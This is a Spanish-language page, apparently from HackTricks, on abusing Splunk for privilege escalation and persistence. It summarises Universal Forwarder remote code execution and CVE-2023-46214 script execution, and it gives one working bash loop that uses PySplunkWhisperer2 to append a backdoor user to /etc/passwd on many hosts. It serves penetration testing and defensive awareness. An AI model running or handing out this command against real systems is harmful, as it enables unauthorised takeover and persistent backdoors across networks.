# Escalada de Privilegios y Persistencia de Splunk

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

Si al **enumerar** una máquina **interna** o **externamente** encuentras que **Splunk está en ejecución** (puerto 8090), si tienes la suerte de conocer alguna **credencial válida** puedes **abusar del servicio de Splunk** para **ejecutar una shell** como el usuario que ejecuta Splunk. Si se está ejecutando como root, puedes escalar privilegios a root.

Además, si ya eres **root y el servicio de Splunk no está escuchando solo en localhost**, puedes **robar** el **archivo de contraseñas** del servicio de Splunk y **descifrar** las contraseñas, o **agregar nuevas** credenciales a él. Y mantener persistencia en el host.

En la primera imagen a continuación puedes ver cómo se ve una página web de Splunkd.



## Resumen de la Explotación del Agente Splunk Universal Forwarder

**Para más detalles consulta el post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)**

**Resumen de la Explotación:**
Una explotación dirigida al Agente Splunk Universal Forwarder (UF) permite a los atacantes con la contraseña del agente ejecutar código arbitrario en sistemas que ejecutan el agente, comprometiendo potencialmente toda una red.

**Puntos Clave:**
- El agente UF no valida las conexiones entrantes ni la autenticidad del código, lo que lo hace vulnerable a la ejecución de código no autorizado.
- Los métodos comunes de adquisición de contraseñas incluyen localizarlas en directorios de red, comparticiones de archivos o documentación interna.
- La explotación exitosa puede llevar a acceso de nivel SYSTEM o root en hosts comprometidos, exfiltración de datos e infiltración adicional en la red.

**Ejecución de la Explotación:**
1. El atacante obtiene la contraseña del agente UF.
2. Utiliza la API de Splunk para enviar comandos o scripts a los agentes.
3. Las acciones posibles incluyen extracción de archivos, manipulación de cuentas de usuario y compromiso del sistema.

**Impacto:**
- Compromiso completo de la red con permisos de nivel SYSTEM/root en cada host.
- Potencial para deshabilitar el registro para evadir la detección.
- Instalación de puertas traseras o ransomware.

**Comando de Ejemplo para la Explotación:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
## Abuso de Consultas de Splunk

**Para más detalles, consulta la publicación [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

El **CVE-2023-46214** permitía cargar un script arbitrario en **`$SPLUNK_HOME/bin/scripts`** y luego explicaba que utilizando la consulta de búsqueda **`|runshellscript script_name.sh`** era posible **ejecutar** el **script** almacenado allí.
